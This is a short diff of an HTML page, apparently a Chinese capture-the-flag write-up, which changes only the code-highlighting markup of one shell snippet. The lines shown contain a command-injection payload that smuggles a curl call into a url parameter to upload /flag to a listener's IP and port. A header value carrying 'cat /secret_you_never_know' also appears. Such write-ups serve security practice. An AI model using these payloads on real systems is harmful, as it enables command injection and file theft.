@@ -684,7 +684,7 @@ X-Forwarded-Host: cat &#x2F;secret_you_never_know<span aria-hidden="true" class=
 <pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;http:&#x2F;&#x2F;监听使用的ip:port&#x2F;&#39; -F file&#x3D;@&#x2F;flag&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>实际传入shell的是</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> <span class="token string">'http://IP:端口/'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">' -F file=@/flag'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl &#39;http:&#x2F;&#x2F;IP:端口&#x2F;&#39;\\&#39;&#39; -F file&#x3D;@&#x2F;flag&#39;\\&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>直接带出文件</p>
 <p><strong>689</strong></p>
